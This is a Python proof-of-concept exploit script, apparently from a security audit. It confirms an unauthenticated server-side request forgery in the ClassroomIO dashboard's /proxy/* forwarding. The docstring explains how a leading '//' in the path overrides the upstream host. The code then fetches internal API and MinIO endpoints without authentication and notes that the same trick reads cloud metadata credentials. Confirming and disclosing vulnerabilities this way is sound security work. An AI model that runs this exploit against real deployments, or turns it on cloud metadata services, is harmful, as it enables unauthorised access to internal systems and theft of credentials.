#!/usr/bin/env python3
"""
VULN-003 (F-44) — Unauthenticated full-read SSRF via the dashboard `/proxy//host`.

Vulnerable code (targets/classroomio/):
  * entry:  apps/dashboard/src/hooks.server.ts:112-114   (forward /proxy/* BEFORE auth)
  * bug:    apps/dashboard/src/lib/utils/proxy-api-request.ts:37-43 (strip `/proxy` prefix)
            apps/dashboard/src/lib/utils/proxy-api-request.ts:129    (new URL(path, apiBase))
  * sink:   apps/dashboard/src/lib/utils/proxy-api-request.ts:155    (fetch(upstreamUrl))

Class: CWE-918 Server-Side Request Forgery (unauthenticated, non-blind).

The flaw: the SvelteKit dashboard forwards every `/proxy/*` request to the API
as the FIRST statement of its request handler, before any session/auth logic.
It strips the literal `/proxy` prefix and passes the remaining path as the
*reference* argument of the two-arg `new URL(reference, apiBase)`. A path that
begins with `//` — e.g. `/proxy//minio:9000/x` -> reference `//minio:9000/x` —
is parsed by WHATWG URL as a protocol-relative URL whose authority OVERRIDES
`apiBase`, so the server fetches `http://minio:9000/x` and returns the body.
There is no host allowlist and interior `//` is never collapsed.

Exploitation idea: `GET http://<dashboard>/proxy//<host>/<path>` with no cookie
makes the dashboard's Node server fetch `http://<host>/<path>` from inside the
compose network / cloud VM and hand the caller the raw response body.

A successful run proves: with NO authentication, we read the internal API
(`api:3081`) and MinIO (`minio:9000`) — hosts reachable only from the server's
network position, not the attacker's — via the dashboard proxy. On a cloud VM
the same primitive reads `169.254.169.254` IMDS credentials.
"""
import os
import sys
import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import log, banner, verdict  # noqa: E402

VULN = "VULN-003"
DASH = os.environ.get("BASE_URL", "http://localhost:21526")   # dashboard (SSRF entry)
API = os.environ.get("API_URL", "http://localhost:21527")     # internal API, also published
# Internal compose-network hostnames that are NOT resolvable from the attacker's
# position — only the dashboard's server can reach them. Reaching them proves SSRF.
INTERNAL_TARGETS = [
    ("//api:3081/", "internal Hono API welcome (api:3081)"),
    ("//minio:9000/minio/health/live", "internal MinIO health (minio:9000)"),
]


def raw_get(url, **kw):
    return requests.get(url, timeout=10, allow_redirects=False, **kw)


def main():
    banner(VULN, "Unauthenticated full-read SSRF via dashboard /proxy//host")
    log("INFO", "exercising apps/dashboard/src/hooks.server.ts:112-114 → proxy-api-request.ts:129/155")
    log("INFO", "the /proxy/* forwarding branch runs BEFORE any auth — no cookie is sent")

    # Baseline: what the internal API says when we hit it directly (it is also
    # published on :21527, so we can compare bodies).
    log("STEP", f"baseline: GET {API}/ directly (published API)")
    baseline = raw_get(f"{API}/")
    log("INFO", f"  direct API body: {baseline.text.strip()[:90]}")

    proofs = []
    # --- the SSRF: point the proxy's URL authority at an internal host ---
    for path, desc in INTERNAL_TARGETS:
        # `//api:3081/...` as the stripped path -> reference arg of new URL() ->
        # authority override. The leading `//` is the whole exploit.
        url = f"{DASH}/proxy{path}"
        log("STEP", f"SSRF: GET {url}  (no cookie) → server should fetch {desc}")
        try:
            r = raw_get(url)
        except Exception as e:
            log("FAIL", f"  request error: {e}")
            continue
        body = r.text.strip()
        log("INFO", f"  proxied response: HTTP {r.status_code}  body[:90]={body[:90]!r}")
        if "api:3081" in path and baseline.text.strip() and body == baseline.text.strip():
            log("PROOF", "dashboard returned the INTERNAL API's welcome JSON verbatim — "
                         "the server fetched http://api:3081/ on our behalf (authority overridden)")
            proofs.append(desc)
        elif "minio:9000" in path and r.status_code == 200:
            log("PROOF", "dashboard reached MinIO's internal health endpoint (only resolvable "
                         "inside the compose network) → server-side fetch of an internal host")
            proofs.append(desc)

    # Save the decisive request/response pair for the report.
    ev = os.path.join(os.path.dirname(os.path.abspath(__file__)), "evidence")
    os.makedirs(ev, exist_ok=True)
    demo_url = f"{DASH}/proxy//api:3081/"
    demo = raw_get(demo_url)
    with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "response.txt"), "w") as f:
        f.write(f"GET {demo_url}  (no Cookie header)\n")
        f.write(f"HTTP {demo.status_code}\n")
        for k, v in demo.headers.items():
            f.write(f"{k}: {v}\n")
        f.write("\n" + demo.text)

    if len(proofs) >= 1:
        verdict(VULN, "CONFIRMED",
                f"unauth SSRF: dashboard proxied to {len(proofs)} internal host(s): {', '.join(proofs)}")
        log("OK", "exploit confirmed — arbitrary internal/metadata hosts are reachable, no auth")
        sys.exit(0)
    verdict(VULN, "FAILED", "proxy did not reach an internal host via // authority override")
    log("FAIL", "no internal host reached — mitigation may be present")
    sys.exit(1)


if __name__ == "__main__":
    main()
